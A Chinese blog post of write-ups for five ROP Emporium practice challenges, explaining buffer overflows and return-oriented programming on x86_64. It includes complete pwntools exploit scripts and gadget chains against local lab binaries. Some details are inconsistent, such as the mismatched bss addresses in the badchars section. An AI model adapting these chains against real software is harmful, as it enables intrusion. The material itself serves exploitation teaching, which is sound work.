---
title: ROP Emporium的一些wp
description: 关于ROP Emporium的一些总结
date: 2026-05-07 22:17:50
updated: 2026-05-07 22:17:50
image: https://img.mushfate.top/2026/05/0bc9fb1703f785617edfb20da547288a.jpg
categories: [技术]
tags: [学习]
---

## ROP Emporium

贴上链接。后编:在做这个项目挑战之前，我并没有寄存器和汇编语言等的相关知识储备，这篇wp是边学边写的记录，如有技术性错误或不严谨的地方，欢迎联系我指正。

::link-card
---
title: ROP Emporium
icon: https://ropemporium.com/favicon/favicon.ico
link: https://ropemporium.com/

class: gradient-card active
---
::

## 1.ret2win

**前情提要: 在s数组(32字节)后面，存在 8 字节的saved rbp(作用是保存调用者的栈帧基址)，而在 save rbp 后面才是我们所需利用的返回地址。所以在ROP链开始时，我们需要填入 32+8=40 字节的无用字符作为填充(表现为`payload = b'1' * 40`) 。从第41字节开始是返回地址的位置，我们需要在这里写入控制程序的内容，让程序乖乖吐出flag。**

用ida打开附件，函数 **pwnme**，看关键两行
```c
_BYTE s[32]；
read(0, s, 56u);
```
确定是栈溢出，函数 **ret2win--0x400756** ->伪代码:
```c
int ret2win()
{
  puts("Well done! Here's your flag:");
  return system("/bin/cat flag.txt");
}
```
执行 **ret2win** 函数会返回flag。但由于 **system()** 调用要求栈必须 16 字节对齐，如果直接跳到函数入口 **0x400756** ，栈会不对齐导致崩溃。有两种解决方案：一是用额外的 **ret gadget** 消耗栈空间使其对齐；二是直接跳到 **0x400757** ，栈自然对齐。(ret是一条汇编指令，意思是：从栈顶取出一个地址，跳过去执行)这里我用ROPgadget 找一个 ret：
```bash
ROPgadget --binary xxx --only "pop|ret"
###输出 0x000000000040053e : ret
```
写payload
```python
#!/usr/bin/env python3
from pwn import *
# 导入pwntools的相关依赖
elf = ELF('./ret2win')
# 静态的ELF对象，可以访问符号表中的值
io = process('./ret2win')
# 加载程序的进程
ret = 0x40053e
payload = b'1'*40 + p64(ret) + p64(0x400756)
# 主要修改这个payload，payload里面的填充需要是bytes类型
io.sendline(payload)
# 将payload通过stdin发给程序
io.interactive()
# 进入交互模式
```
得到flag:`ROPE{a_placeholder_32byte_flag!}`

原理大概是这样，**read()** 把这串数据写进栈里，覆盖掉了返回地址。当 **pwnme()** 执行完 **ret** 时，它不会回正常位置，而是跳到我们伪造的地址。
栈可以想象成这样，越下面越后面被取到：

```
[  1 * 40  ]
[ 0x40053e ]  <- 第一次 ret 跳到这里
[ 0x400756 ]  <- "ret2win"
```
执行过程是这样，**pwnme **结束，执行自己的 ret，这时它会从栈顶取出一个地址跳过去，也就是跳到 **0x40053e**->那个单独的 ret。执行 **0x40053e: ret**，这条 ret 会从栈顶取下一个地址继续跳：也就是 **0x400756**，执行 **ret2win**,出flag


## 2.split

**前情提要:函数 system@plt 可以执行命令**

依旧是pwnme里关键的两行

```c
_BYTE s[32];
read(0, s, 96u);
```

栈溢出,这里在函数列表里看到一个特殊的函数 **usefulFunciton** 。伪代码里只有一句`return system("/bin/ls")`，也就是列出当前目录下的所有文件和文件夹。由于 ROP Emporium 是纯本地练习题，flag文件已经确认，这里在ROP链上就不使用这个函数了，~~哦吼吼绝对不是懒~~，在有远程靶机地址的情况下需要额外使用这个函数确认flag的文件名。

目前还没找到flag的相关信息,尝试扩大检索范围。同时按下 shift + F4 打开 **name** 列表，可以看到有一个特殊的字符串 **usefulString -- 0x601060** ,具体内容是`/bin/cat flag.txt'`。这就是我们需要的字符串。目标明确了:**让 system@plt -- 0x400560 执行/bin/cat flag.txt，从而读取并打印flag。**

另外补充一下，x86_64 的函数参数传递规则是：函数的第一个参数传给**寄存器 rdi** ，第二个参数传给**寄存器 rsi** ，第三个参数传给**寄存器 rdx** ...这里的 **system@plt** 只需要`/bin/cat flag.txt`这一个参数，因此在这题只需要找出**寄存器 rdi** 即可。

先用 ROPgadget 找到我们需要的 gadget 

```bash
ROPgadget --binary split --only "pop|ret"
###输出  0x000000000040053e : ret
###	    0x00000000004007c3 : pop rdi ; ret
```

套个模板

```python
#!/usr/bin/env python3
from pwn import *
# 导入pwntools的相关依赖
elf = ELF('./split')
# 静态的ELF对象，可以访问符号表中的值
io = process('./split')
pop_rdi_ret = 0x4007c3
# 加载程序的进程
ret = 0x40053e
system_plt = 0x400560
bin_cat_flag = 0x601060
payload = b'1' * 40
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(bin_cat_flag)
payload += p64(system_plt)
# 主要修改这个payload，payload里面的填充需要是bytes类型
io.sendline(payload)
# 将payload通过stdin发给程序
io.interactive()
# 进入交互模式
```

得到flag：`ROPE{a_placeholder_32byte_flag!}`

## 3.callme

栈溢出,在function列表里看到有 **usefulfunction **分别是

```c
callme_one(a1, a2, a3)
callme_two(a1, a2, a3)
callme_three(a1, a2, a3)
```

ida打开另一个附件 **libcallme.so** 查看这几个函数的具体内容。可以看到想执行三个函数有一个共同条件:`a1 = 0xDEADBEEFDEADBEEF || a2 = 0xCAFEBABECAFEBABE || a3 = 0xD00DF00DD00DF00D`。在满足a1,a2,a3的参数条件后 **callme_one** 的有效内容是`fopen("encrypted_flag.dat", "r")`-->打开加密的flag文件, **callme_two** 的有效内容是 `fopen("key1.dat", "r")-->第一层解密` , **callme_three** 的有效内容是`fopen("key2.dat", "r")-->第二层解密`，也就是说我们需要按照one->two->three的顺序去依次调用这三个函数。由于每个 callme 函数都有三个参数,我们需要找三个寄存器**rdi,rsi,rdx**的 gadget 。在callme附件,可以看到usefulGadget里已经给了我们解题需要的 gadget :`pop_rdi_rsi_rdx--0x40093c` 。

万事具备,套模板！

```Python
#!/usr/bin/env python3
from pwn import *
# 导入pwntools的相关依赖
context.arch = 'amd64'
elf = ELF('./callme')
# 静态的ELF对象，可以访问符号表中的值
io = process('./callme')
    # 加载程序的进程
callme_one = 0x400720
callme_two = 0x400740
callme_three = 0x4006F0
a1 = 0xDEADBEEFDEADBEEF
a2 = 0xCAFEBABECAFEBABE
a3 = 0xD00DF00DD00DF00D
pop_rdi_rsi_rdx = 0x40093c
payload = flat(
    b"1" * 40,
    pop_rdi_rsi_rdx, a1, a2, a3,callme_one,
    pop_rdi_rsi_rdx, a1, a2, a3,callme_two,
    pop_rdi_rsi_rdx, a1, a2, a3,callme_three,
)
# 主要修改这个payload，payload里面的填充需要是bytes类型
io.sendline(payload)
# 将payload通过stdin发给程序
io.interactive()
# 进入交互模式
```

拿到flag:`ROPE{a_placeholder_32byte_flag!}`

相信有细心的已经发现了,在这段脚本里我使用了 **flat** 这个函数取代了臃肿的 **payload+=** 。在ROP链里, **flat** 可以按照顺序自动把每一段payload增添到已写的payload后面。如 `pop_rdi_rsi_rdx, a1, a2, a3,callme_one` 里,**a1,a2,a3**根据顺序依次存入寄存器**rdi,rsi,rdx**,作为调用 **callme_one** 的三个参数,保证程序正常运行。在使用 **flat** 函数时，需要在脚本开头加上这样一段话 `context.arch = 'amd64'`, 这段话可以让 `flat()` 使用 **64 位**打包。这是因为`flat()` 默认使用 **32位** 打包，数值太大会超出了范围,造成程序报错。

## 4.badchars

反汇编，查关键函数。用ida在字符列表里看到提示**usefulFunction**和**usefulGadget**,先点进有用的函数看看

```c
__int64 usefulFunction()
{
  return print_file("nonexistent");
}
```

这一题是利用**printfile**函数，只要我们知道flag文件的文件名，就可以将这个地址作为**printfile**函数的参数，让它打印出flag。尝试将'flag.txt'字符串进行64位打包后塞进空的bss里作为**printfile**的参数。由于汇编里没有现成的flag.txt，猜测作者的意图是让我们把经过编码后的'flag.txt'字符串放进事先准备好的空地址，而后让这个地址作为**printfile**函数的参数，打印出flag。理论成立，现在开始动手操作。

首先 shift+f7 打开**segments**列表找到我们需要的`bss`地址:0x201068，再利用ROPgadget筛选出需要的gadget 

```bash
ROPgadget --binary badchars --only 'pop|ret'
	           |  |           |         |
			文件的名称		  筛选	需要筛选的gadget
###输出	0x00000000004006a3 : pop rdi ; ret
###		0x00000000004004ee : ret
###		0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
###		0x00000000004006a0 : pop r14 ; pop r15 ; ret
ROPgadget --binary badchars --only 'mov|ret'
###输出	0x0000000000400634 : mov qword ptr [r13], r12 ; ret
```

套上模板

```py
#!/usr/bin/env python3
from pwn import *
# 导入pwntools的相关依赖
context.arch = 'amd64'
elf = ELF('./badchars')
# 静态的ELF对象，可以访问符号表中的值
io = process('./badchars')
# 加载程序的进程
pop_ret = 0x4004ee
pop_r12_r13_r14_r15 = 0x40069c
mov_qword_r13_r12 = 0x400634
bss = 0x601038
pop_rdi = 0x4006a3
printfile = 0x400510
flag_u64 = u64(b'flag.txt')
payload =flat(
    b'1'*40,
    pop_ret,
    pop_r12_r13_r14_r15,flag_u64,bss,0,0,
    mov_qword_r13_r12,
    pop_rdi,bss,
    printfile
)
# 主要修改这个payload，payload里面的填充需要是bytes类型
io.sendline(payload)
# 将payload通过stdin发给程序
io.interactive()
# 进入交互模式
```

返回

```
badchars are: 'x', 'g', 'a', '.'
> Thank you!
```

输出中并没有flag，而是一串提示。根据提示并结合**name**列表中的***badcharacters***伪代码可知,我们输入的‘flag.txt’中的'g','a','.'在read()读取输入阶段时会被程序过滤。为此我们不能直接将flag.txt传入**bss**,需要想方设法绕过可恶的过滤...(思索)...等等，我们在前面看到的usefulGadget:`xor     [r15], r14b`在这个脚本中并没有被用到,它的作用是:'r15' ^=r14b。因此我们可以考虑先将xor编码后的'flag.txt'放进**bss**，绕过初步的**read()**阶段的过滤后再在内存阶段对xor编码后的'flag.txt'进行解密，这样，就能将'flag.txt'完好无所地放进**bss**里了。立马动手试试。首先我们需要保证经过xor转换后的'flag.txt'不会被坏字符过滤,写一个脚本，寻找可用的xorkey。

```py
badchars = {0x78, 0x67, 0x61, 0x2e}  # x, g, a, .
target = b"flag.txt"
for key in range(1,10):
    if all((c ^ key) not in badchars for c in target):
        print(f"key={key} 可用")
###	key=2 可用
###	key=3 可用
###	key=4 可用
###	key=5 可用
###	key=8 可用
###	key=9 可用
```

确认了xorkey之后就可以写payload了，套模板

```py
#!/usr/bin/env python3
from pwn import *
# 导入pwntools的相关依赖
context.arch = 'amd64'
elf = ELF('./badchars')
# 静态的ELF对象，可以访问符号表中的值
io = process('./badchars')
# 加载程序的进程
pop_ret = 0x4004ee
pop_r12_r13_r14_r15 = 0x40069c
pop_r14_r15 = 0x4006a0
mov_qword_r13_r12 = 0x400634
bss = 0x601038
pop_rdi = 0x4006a3
printfile = 0x400510
xor_key = 2
xor_r15_r14b = 0x400628
encoded_flag = bytes([c ^ xor_key for c in b'flag.txt'])
q_encoded_flag = u64(encoded_flag)
payload =flat(
    b'1'*40,
    pop_ret,
    pop_r12_r13_r14_r15,q_encoded_flag,bss,0,0,
    mov_qword_r13_r12,
)
for i in range(8):
    payload += flat(
        pop_r14_r15,xor_key,bss+i,
        xor_r15_r14b
    )
payload += flat(
    pop_rdi,bss,
    printfile
)
# 主要修改这个payload，payload里面的填充需要是bytes类型
io.sendline(payload)
# 将payload通过stdin发给程序
io.interactive()
# 进入交互模式
```

成功输入flag:`ROPE{a_placeholder_32byte_flag!}`

## 5.fluff

用ida反汇编，查看关键函数。这题的关键函数依旧是**printfile**，不过这一题的利用思路略有不同。在ROPgadget后并没有找到可用的mov gadget,也就是说我们不能简单地直接将'flag.txt'直接通过mov直接塞入bss，继续找找别的有用条件。

在**name**里找到了questionableGadget：

```bash
.text:0000000000400628                 xlat
.text:000000000040062A ; ---------------------------------------------------------------------------
.text:000000000040062A                 pop     rdx
.text:000000000040062B                 pop     rcx
.text:000000000040062C                 add     rcx, 3EF2h
.text:0000000000400633                 bextr   rbx, rcx, rdx
.text:0000000000400639 ; ---------------------------------------------------------------------------
.text:0000000000400639                 stosb
```

粗略介绍一下每个gadget的作用:

xlat:al = [rbx + al]，从内存读取[rbx+al]上内容的一个字节到 al

stosb:[rdi] = al，然后 rdi+1

bextr rbx ,rcx ,rdx: rbx = rcx 的rdx的**低 8 位**到高8位

这些gadget在构造payload上都起到什么作用呢？让我们从如何让**printfile**函数为我们所用开始逆推，我们的目标是把'flag.txt'写入rdi这个gadget。stosb可以**把我们构造的al一字节一字节地写入rdi，而xlat可以用于构造al**。由于**stosb只能单字节地将al写入rdi**，因此每一次**al = [rbx + al]**后都要保证al在计算后等于我们要构造的'flag.txt'里的单字节，**所以rbx = ‘ 'flag.txt'的内存地址 - perv_al'**，这样就能在xlat后使al等于我们所需要的单字符了。由于**题目内没有能直接写入的rbx**，因此我们需要用到bextr rbx ,rcx ,rdx。**先构造rcx**，让rcx在add 3EF2h后等于我们需要构造的rbx。这样一个逻辑完整的payload思路就构造完毕了。直接上模板。

```py
#!/usr/bin/env python3
from pwn import *
# 导入pwntools的相关依赖
context.arch = 'amd64'
elf = ELF('./fluff')
# 静态的ELF对象，可以访问符号表中的值
io = process('./fluff')
# 加载程序的进程
pop_ret = 0x400295
pop_rdi_ret = 0x4006a3
xlat_ret = 0x400628
pop_rdx_pop_rcx_add_bextr_ret = 0x40062a
mov_eax_0_pop_rbp_ret = 0x400610
stosb_ret = 0x400639
flag_txt = [0x4003c4, 0x400239, 0x4003d6, 0x4003cf, 0x40024e, 0x400192, 0x400246,0x400192]
bss = 0x601038
print_file = 0x400510
prev_al = 0
payload = flat(
    b'1' * 40,
    mov_eax_0_pop_rbp_ret, 0
)
for c in range(8):
    payload += flat(
        pop_rdx_pop_rcx_add_bextr_ret, 0x4000,flag_txt[c] - 0x3ef2 - prev_al, 
        xlat_ret,
        pop_rdi_ret, bss + c,
        stosb_ret
    )
    prev_al = ord('flag.txt'[c])
payload += flat(
    pop_ret,
    pop_rdi_ret, bss,print_file
)    
# 主要修改这个payload，payload里面的填充需要是bytes类型
io.sendline(payload)
# 将payload通过stdin发给程序
io.interactive()
# 进入交互模式
```

反反复复写了好几次payload，终于把逻辑理清楚了，但是还是没有出flag，让ai找了原因，没曾想是payload太长了。具体成因如下，在这个payload的for循环里，每轮循环都会重新设置rdi，payload会相当臃肿从而超过了read() 阶段只能读取512字节的限制。解决方案是利用stosb会自动让下一次rdi+1的特性，不再在for循环里设置rdi，改为只在循环前设置一次rdi。正确的payload如下

```py
#!/usr/bin/env python3
from pwn import *
# 导入pwntools的相关依赖
context.arch = 'amd64'
elf = ELF('./fluff')
# 静态的ELF对象，可以访问符号表中的值
io = process('./fluff')
# 加载程序的进程
pop_ret = 0x400295
pop_rdi_ret = 0x4006a3
xlat_ret = 0x400628
pop_rdx_pop_rcx_add_bextr_ret = 0x40062a
mov_eax_0_pop_rbp_ret = 0x400610
stosb_ret = 0x400639
flag_txt = [0x4003c4, 0x400239, 0x4003d6, 0x4003cf, 0x40024e, 0x400192, 0x400246,0x400192]
bss = 0x601038
print_file = 0x400510
prev_al = 0
payload = flat(
    b'1' * 40,
    mov_eax_0_pop_rbp_ret, 0
)
payload += flat(pop_rdi_ret, bss)
for c in range(8):
    payload += flat(
        pop_rdx_pop_rcx_add_bextr_ret, 0x4000,flag_txt[c] - 0x3ef2 - prev_al, 
        xlat_ret,
        stosb_ret
    )
    prev_al = ord('flag.txt'[c])
payload += flat(
    pop_ret,
    pop_rdi_ret, bss,print_file
)    
# 主要修改这个payload，payload里面的填充需要是bytes类型
io.sendline(payload)
# 将payload通过stdin发给程序
io.interactive()
# 进入交互模式
```

成功输出flag:`ROPE{a_placeholder_32byte_flag!}`
